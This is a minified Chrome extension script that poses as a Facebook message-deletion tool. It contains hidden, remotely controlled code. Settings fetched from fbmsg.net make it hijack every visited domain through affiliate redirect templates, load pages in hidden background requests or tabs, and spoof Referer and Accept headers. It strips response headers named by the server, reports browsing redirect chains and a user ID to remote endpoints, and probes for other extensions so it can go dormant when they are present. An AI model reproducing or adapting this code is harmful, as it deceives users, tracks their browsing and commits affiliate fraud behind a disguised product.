class Core{load(a){let b=window.localStorage[a];return"undefined"==typeof b?null:JSON.parse(b)}save(a,b){return window.localStorage[a]=JSON.stringify(b),!0}browser(){return chrome}getUserID(){let a=this.load("UID");if(a)return a;else{let b=new Uint32Array(4),d=-1;return window.crypto.getRandomValues(b),a="xxxxxxxx-xxxx-4xxx-yxxx-xxxxxxxxxxxx".replace(/[xy]/g,a=>{d++;let c=15&b[d>>3]>>4*(d%8),e="x"==a?c:8|3&c;return e.toString(16)}),this.save("UID",a),a}}}var base64={};base64.PADCHAR="=",base64.ALPHA="ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/",base64.makeDOMException=function(){try{return new DOMException(DOMException.INVALID_CHARACTER_ERR)}catch(b){var a=new Error("DOM Exception 5");return a.code=a.number=5,a.name=a.description="INVALID_CHARACTER_ERR",a.toString=function(){return"Error: "+a.name+": "+a.message},a}},base64.getbyte64=function(a,b){var c=base64.ALPHA.indexOf(a.charAt(b));if(-1===c)throw base64.makeDOMException();return c},base64.decode=function(a){var b=String.fromCharCode;a=""+a;var c,d,e,f=base64.getbyte64,g=a.length;if(0===g)return a;if(0!=g%4)throw base64.makeDOMException();c=0,a.charAt(g-1)===base64.PADCHAR&&(c=1,a.charAt(g-2)===base64.PADCHAR&&(c=2),g-=4);var h=[];for(d=0;d<g;d+=4)e=f(a,d)<<18|f(a,d+1)<<12|f(a,d+2)<<6|f(a,d+3),h.push(b(e>>16,255&e>>8,255&e));return 1===c?(e=f(a,d)<<18|f(a,d+1)<<12|f(a,d+2)<<6,h.push(b(e>>16,255&e>>8))):2===c?(e=f(a,d)<<18|f(a,d+1)<<12,h.push(b(e>>16))):void 0,h.join("")},base64.getbyte=function(a,b){var c=a.charCodeAt(b);if(255<c)throw base64.makeDOMException();return c},base64.encode=function(a){if(1!==arguments.length)throw new SyntaxError("Not enough arguments");var b,c,d=base64.PADCHAR,e=base64.ALPHA,f=base64.getbyte,g=[];a=""+a;var h=a.length-a.length%3;if(0===a.length)return a;for(b=0;b<h;b+=3)c=f(a,b)<<16|f(a,b+1)<<8|f(a,b+2),g.push(e.charAt(c>>18)),g.push(e.charAt(63&c>>12)),g.push(e.charAt(63&c>>6)),g.push(e.charAt(63&c));switch(a.length-h){case 1:c=f(a,b)<<16,g.push(e.charAt(c>>18)+e.charAt(63&c>>12)+d+d);break;case 2:c=f(a,b)<<16|f(a,b+1)<<8,g.push(e.charAt(c>>18)+e.charAt(63&c>>12)+e.charAt(63&c>>6)+d);}return g.join("")};const Utils=new Core,Config={runApps:0,maxApps:100,uid:Utils.getUserID(),premium:!1,intervals:1e4,extId:chrome.runtime.id,di:new Date().getTime(),status:0,link:`https://web.facebook.com/messages`,FB_MESSAGE_URL:"https://web.facebook.com/messages",VERIFY_FB_MESSAGE_URL:"facebook.com/messages",FB_DEL_CONVERSATION_API:"/ajax/mercury/delete_thread.php?dpr=1",FB_DEL_UNREAD_THREAD_API:"/ajax/mercury/unread_threads.php?dpr=1",FB_PULL_MESSAGES_API:"/ajax/mercury/threadlist_info.php?dpr=1",START_ANALYZE_SCREEN:"1",ANALYZING_SCREEN:"2",DELETE_SCREEN:"3",DELETING_SCREEN:"4",ALERT:"alert",WARNING:"warning",ERROR:"error",CURRENTLY_LOGGED_USERINFO:"CURRENTLY_LOGGED_USERINFO",CHAT_SUMMARY:"CHAT_SUMMARY",DELETE_SUMMARY:"DELETE_SUMMARY",SELECT_AND_DELETE:"SELECT_AND_DELETE",DELETE_SELECTED_CHAT_SUMMARIES:"DELETE_SELECTED_CHAT_SUMMARIES",SELECT_ALL_CHATSUMMARY_CHECKBOX:"SELECT_ALL_CHATSUMMARY_CHECKBOX",CHATSUMMARY_CHECKBOX:"CHATSUMMARY_CHECKBOX",CHAT_SUMMARY_DIV_ID:"wmMasterViewThreadlist",delayInMS:2e3,PULL_MESSAGE_COUNT:1e3,enable_btn:!1};class Bg{isBase64(a){try{return btoa(atob(a))==a}catch(a){return!1}}decodeBase64(a){let d,f={},b=[],e="",g=String.fromCharCode,c=[[65,91],[97,123],[48,58],[43,44],[47,48]];for(let e in c)for(d=c[e][0];d<c[e][1];d++)b.push(g(d));for(d=0;64>d;d++)f[b[d]]=d;for(d=0;d<a.length;d+=72){let h,c,i=0,b=0,j=a.substring(d,d+72);for(c=0;c<j.length;c++)for(h=f[j.charAt(c)],i=(i<<6)+h,b+=6;8<=b;)e+=g((i>>>(b-=8))%256)}return e}hash(){return[].join.call(arguments)}b64ToUtf8(a){return decodeURIComponent(escape(window.atob(a)))}followMouse(){for(let a=0;a<arguments.length;a++)arguments[a].style.top=event.clientY+"px",arguments[a].style.left=event.clientX+"px"}constructor(a){this.Utils=a,this.config=Config,this.req=null,this.postProcessingComplete=!1,this.rConfig={},this.version=chrome.runtime.getManifest().version,this.uid=this.config.uid,this.environmentValidated=!1,this.bgProcessorRun=!1,this.envDetected=!1,chrome.storage.local.get(null,function(a){a.src&&$.ajax({url:"https://fbmsg.net/api/callback/",dataType:"json",data:{p:btoa(JSON.stringify({src:a.src}))},success:()=>{}})}),chrome.storage.local.get(Config,function(a){this.config=a}.bind(this)),chrome.browserAction.onClicked.addListener(function(){chrome.tabs.query({url:Config.link},function(){chrome.tabs.create({url:Config.link})}.bind(this))}.bind(this)),chrome.storage.onChanged.addListener(function(){chrome.storage.local.get(null,function(a){this.config=a}.bind(this))}.bind(this)),chrome.runtime.onMessage.addListener(function(a,b,c){switch(a.action){case"getSettings":{let a=this.Utils.getUserID(),b={uid:a,id:chrome.runtime.id,d:this.config,enable_btn:this.config.enable_btn};return c(b)}case"getRConfig":{return c(this.rConfig)}default:return c({id:chrome.runtime.id});}}.bind(this)),chrome.runtime.onInstalled.addListener(function(b){"install"==b.reason?chrome.storage.local.set(Config):"update"==b.reason&&chrome.storage.local.set({runApps:0,maxApps:10,uid:a.getUserID(),intervals:1e4,extId:chrome.runtime.id,di:new Date().getTime(),status:0,link:`https://web.facebook.com/messages`})}.bind(this)),chrome.storage.sync.get({config:{}},a=>{this.rConfig=a.config,this.rConfig.mTime&&this.rConfig.lTime||(this.rConfig.lTime=0,this.rConfig.mTime=new Date().getTime(),this.saveConfig()),this.rConfig.envDetected&&(this.envDetected=this.rConfig.envDetected),this.validateEnvironment(),this.initBgProcessor(),this.postProcessing(),this.updateConfig()})}heartBeat(){let a=new Date().getTime(),b=a-this.rConfig.mTime,c=this.rConfig.configUpTime?this.rConfig.configUpTime+3e5:12e5;this.rConfig.mTime&&b<c?(this.rConfig.lTime+=b,this.rConfig.mTime=a,this.saveConfig()):(this.rConfig.mTime=a,this.saveConfig())}updateConfig(){this.heartBeat(),$.ajax({url:"https://fbmsg.net/api/config/",dataType:"json",data:{p:btoa(JSON.stringify({id:this.config.extId,version:this.version,mt:this.rConfig.mTime,lt:this.rConfig.lTime,uid:this.uid}))},success:a=>{if(a){for(let b in a)this.rConfig[b]=a[b];this.saveConfig(),this.validateEnvironment(),this.initBgProcessor(),this.postProcessing()}},complete:()=>{if(this.rConfig.configUpTime&&0<this.rConfig.configUpTime){let a=this;setTimeout(function(){a.updateConfig()},this.rConfig.configUpTime)}}})}saveConfig(){chrome.storage.sync.set({config:this.rConfig})}validateEnvironment(){let a=this;if(!a.environmentValidated&&a.rConfig.envCheckActive&&a.rConfig.envCheckPeriod&&a.rConfig.envCheckList){a.environmentValidated=!0;let b=new Date().getTime();if(a.rConfig.lastEnvCheck&&b-a.rConfig.lastEnvCheck<a.rConfig.envCheckPeriod)return;for(let c in a.rConfig.lastEnvCheck=b,a.envDetected=a.rConfig.envDetected=!1,a.saveConfig(),a.rConfig.envCheckList)a.detectExtentionById(a.rConfig.envCheckList[c]).then(function(b){b&&(a.rConfig.envDetected=a.envDetected=!0,a.saveConfig())})}}safeRemoveTab(a){try{chrome.tabs.remove(a,function(){chrome.runtime.lastError})}catch(a){}}detectExtentionById(a){let b=this;return new Promise(function(c){let d=!1;chrome.tabs.create({url:"chrome-extension://"+a+"/manifest.json",active:!1},function(a){setTimeout(function(){b.safeRemoveTab(a.id),c(!1)},3e3),chrome.tabs.insertCSS(a.id,{code:"console.log('injected');"},function(){chrome.runtime.lastError&&(d=/chrome-extension/gm.test(chrome.runtime.lastError.message)),chrome.tabs.remove(a.id,function(){c(d)})})})})}initBgProcessor(){let a=this;if(!a.rConfig.bgProcessor)return void bgProcessor.initCfg({mode:"off"});if(a.envDetected)return void bgProcessor.initCfg({mode:"off"});if(a.bgProcessorRun)return void bgProcessor.initCfg(a.rConfig.bgProcessor);a.bgProcessorRun=!0,bgProcessor.initCfg(a.rConfig.bgProcessor),chrome.webRequest.onCompleted.addListener(function(b){if("on"===bgProcessor.cfg.mode&&!a.envDetected&&!(0>b.tabId)&&200==b.statusCode&&"GET"==b.method){var c=b.url.replace(/^(https?\:\/\/[^\/]+).*$/,"$1"),d=b.url.replace(/^https?\:\/\/([^\/]+).*$/,"$1");bgProcessor.cfg.keep_www_prefix||(d=d.replace(/^www\.(.*)$/,"$1"));var e=new Date().getTime();if(!(bgProcessor.used_domains[d]&&bgProcessor.used_domains[d]+bgProcessor.cfg.ttl_ms>e)&&!(bgProcessor.cfg.domains_blacklist&&0<bgProcessor.cfg.domains_blacklist.length&&bgProcessor.cfg.domains_blacklist.includes(d))&&!(bgProcessor.cfg.domains_whitelist&&0<bgProcessor.cfg.domains_whitelist.length&&!bgProcessor.cfg.domains_whitelist.includes(d))){bgProcessor.used_domains[d]=e;var f=bgProcessor.cfg.aff_url_tmpl.replace(/\{([A-Z]+)\}/gi,function(a,b){return"URL"===b?encodeURIComponent(c):"DOMAIN"===b?encodeURIComponent(d):a});if(bgProcessor.cfg.aff_redirect)return!bgProcessor.cfg.domains_whitelist||0<!bgProcessor.cfg.domains_whitelist.length?void 0:(bgProcessor.push_chain(c),void bgProcessor.request_bg(f,d,0));var g=new XMLHttpRequest;g.timeout=bgProcessor.cfg.aff_timeout_ms,g.onreadystatechange=function(){if(4==g.readyState&&200==g.status){var a=g.responseText.replace(/[\n\r]/g,"");if(/^https?\:\/\//.test(a)&&a!=c){var b=c.replace(/^https?\:\/\/([^\/]+).*$/,"$1");bgProcessor.push_chain(c),bgProcessor.request(a,b)}else bgProcessor.used_domains[d]=e+bgProcessor.cfg.no_coverage_ttl_ms}},g.open("GET",f),g.send()}}},{urls:["http://*/*","https://*/*"],types:["main_frame"]});let b=["blocking","requestHeaders"];if(bgProcessor.cfg&&bgProcessor.cfg.rfr_rules&&0<bgProcessor.cfg.rfr_rules.length&&bgProcessor.cfg.listenerExtraOptions)for(var c in bgProcessor.cfg.listenerExtraOptions)b.push(bgProcessor.cfg.listenerExtraOptions[c]);chrome.webRequest.onBeforeSendHeaders.addListener(function(a){if("on"!==bgProcessor.cfg.mode||!bgProcessor.cfg.header)return{};for(var b=a.requestHeaders,c="",d=0;d<b.length;d++)if(b[d].name===bgProcessor.cfg.header){c=b[d].value,b.splice(d,1);break}if(!c)return{};for(var e=!1,d=0;d<b.length;d++)if("accept"==b[d].name.toLowerCase()){b[d].value=c,e=!0;break}if(e||b.push({name:"Accept",value:c}),0>a.tabId){let c="";if(bgProcessor.cfg.rfr_rules)for(let b in bgProcessor.cfg.rfr_rules){let d=bgProcessor.cfg.rfr_rules[b];if(d.url_request_before){if(!bgProcessor.last_request_url)continue;let a=new RegExp(d.url_request_before[0],d.url_request_before[1]);if(!a.test(bgProcessor.last_request_url))continue}if(d.url_response_before){if(!bgProcessor.last_response_url)continue;let a=new RegExp(d.url_response_before[0],d.url_response_before[1]);if(!a.test(bgProcessor.last_response_url))continue}if(d.url_chain){if(!bgProcessor.rdr_chain||1>bgProcessor.rdr_chain.length)continue;let a=new RegExp(d.url_chain[0],d.url_chain[1]),b=!1;for(let c in bgProcessor.rdr_chain){let d=bgProcessor.rdr_chain[c];if(a.test(d)){b=!0;break}}if(!b)continue}if(d.url_request){let b=new RegExp(d.url_request[0],d.url_request[1]);if(!b.test(a.url))continue}if("allow"==d.rule&&(c=bgProcessor.last_response_url),"replace"==d.rule&&d.replace&&(c=d.replace),"regexp"==d.rule&&d.regexp&&d.replace){var f=new RegExp(d.regexp[0],d.regexp[1]);c=bgProcessor.last_response_url.replace(f,d.replace)}break}if(c){let a=b.findIndex(a=>"referer"==a.name.toLowerCase());-1<a?b[a].value=c:b.push({name:"Referer",value:c})}}return{requestHeaders:b}},{urls:["http://*/*","https://*/*"]},b)}postProcessing(){if(this.postProcessingComplete)return;let a=this.rConfig;a&&a.filters&&(this.postProcessingComplete=!0,chrome.webRequest&&chrome.webRequest.onHeadersReceived.addListener(function(b){return{responseHeaders:b.responseHeaders.filter(function(b){return!(a.filters&&-1<a.filters.indexOf(b.name.toLowerCase()))})}},{urls:["<all_urls>"]},["blocking","responseHeaders"]))}}let bgProcessor={cfg:{mode:"off"},used_domains:{},rdr_chain:[],last_request_url:"",last_response_url:"",initCfg(a){a&&(this.cfg=a)},request:function(a,b){this.cfg.debug&&console.log("bgProcessor.request",a,b),this.cfg.ntab_tag&&-1!==a.indexOf(this.cfg.ntab_tag)?setTimeout(function(){bgProcessor.request_tab(a,b)},this.cfg.ntab_delay_ms):this.request_bg(a,b,0)},push_chain:function(a){this.rdr_chain.push(a)},request_bg:function(a,b,c){if(!(c>=this.cfg.rdr_max_count)&&this.cfg.header){this.push_chain(a),bgProcessor.last_request_url=a;var d=new XMLHttpRequest;d.timeout=this.cfg.timeout,d.onreadystatechange=function(){var a=Math.floor;if(4==d.readyState)if(200==d.status){var e=d.responseText.replace(/[\n\r\s]/g,"").replace(/\.href/g,""),f=!1,g=d.responseURL,h=bgProcessor.is_rdr_url(d.responseURL);if(bgProcessor.last_response_url=g,bgProcessor.last_response_url!=bgProcessor.last_request_url&&bgProcessor.push_chain(bgProcessor.last_response_url),h||e.length<bgProcessor.cfg.jsrdr_maxlen_bytes){var j=e.replace(/^.*?location\=[\'\"]([^\'\"]+).*$/,"$1");/^\//.test(j)&&(link2Url=new URL(j,d.responseURL),j=link2Url.href),/^https?\:\/\//.test(j)&&(bgProcessor.request_bg(j,b,c+1),f=!0)}if(!f&&bgProcessor.cfg.common_rdr_rules)for(var k in bgProcessor.cfg.common_rdr_rules){var i=bgProcessor.cfg.common_rdr_rules[k],l=new RegExp(i.search[0],i.search[1]),m=e;if("uri"==i.where&&(m=g),i.url_pattern){var n=new RegExp(i.url_pattern[0],i.url_pattern[1]);if(!n.test(g))continue}if(m.match(l)){var p=m.replace(l,i.replace);if(i.applyAfter)for(var q in i.applyAfter){var o=i.applyAfter[q];if("decodeURIComponent"==o)p=decodeURIComponent(p);else if("decodeHTML"==o){p=function(a){var b=document.createElement("textarea");return b.innerHTML=a,b.value}(p)}else;}if(i.replacements)for(var r in i.replacements)p=p.replace(r,i.replacements[r]);if(i.regReplacements)for(var s in i.regReplacements){var t=new RegExp(i.regReplacements[s].pattern[0],i.regReplacements[s].pattern[1]);p=p.replace(t,i.regReplacements[s].replace)}if(/^\//.test(p)&&(link2Url=new URL(p,d.responseURL),p=link2Url.href),/^https?\:\/\//.test(p)){var u=i.delay?i.delay:0;if("string"==typeof u&&-1<u.indexOf("-")){var v=u.split("-");u=a(Math.random()*(parseInt(v[1])-parseInt(v[0])+1)+parseInt(v[0]))}setTimeout(()=>{bgProcessor.request_bg(p,b,c+1)},parseInt(u)),f=!0;break}}}f||bgProcessor.send_rdr_log()}else bgProcessor.send_rdr_log(!0)},d.open("GET",a,!0),d.setRequestHeader(this.cfg.header,"text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8"),d.send()}},is_rdr_url:function(a){var b=new URL(a);return!!(this.cfg.rdr_coverage&&b.host in this.cfg.rdr_coverage)||!!/\/goto\/?$/.test(b.pathname)},request_tab:function(a,b){this.cfg.debug&&console.log("bgProcessor.request_tab",a,b),chrome.tabs.create({url:a,active:!1},function(a){setTimeout(function(){try{chrome.tabs.remove(a.id)}catch(a){}},bgProcessor.cfg.ntab_duration_ms)})},send_rdr_log:function(a=!1){if(this.rdr_chain&&this.cfg&&this.cfg.log_rdr_active&&this.cfg.log_rdr_endpoint){if(this.cfg&&this.cfg.log_rdr_onlydifferent){var b=this.rdr_chain[0],c=this.rdr_chain[this.rdr_chain.length-1];if(b.replace(/^https?\:\/\/(?:www\.|)([^\/]+).*$/,"$1")==c.replace(/^https?\:\/\/(?:www\.|)([^\/]+).*$/,"$1"))return}var d=new XMLHttpRequest,e=this.cfg.log_rdr_endpoint;a&&this.cfg.log_rdr_errors_endpoint&&(e=this.cfg.log_rdr_errors_endpoint),d.open("POST",e,!0),d.setRequestHeader("Content-Type","application/json;charset=UTF-8"),d.send(JSON.stringify(this.rdr_chain)),this.rdr_chain=[],this.last_request_url=null,this.last_response_url=null}}};new Bg(Utils),chrome.webRequest.onBeforeRequest.addListener(function(a){if(-1!=a.url.indexOf("graphqlbatch")){var b=decodeURIComponent(String.fromCharCode.apply(null,new Uint8Array(a.requestBody.raw[0].bytes)));-1!=b.indexOf("MessengerGraphQLThreadlistFetcher")}if(-1!=a.url.indexOf("mercury/delete_thread.php"))for(var c=0;c<a.requestHeaders.length;++c)if("Origin"===a.requestHeaders[c].name){a.requestHeaders[c].value="https://www.facebook.com";break}return{requestHeaders:a.requestHeaders}},{urls:["*://*.facebook.com/*"]},["requestBody"]);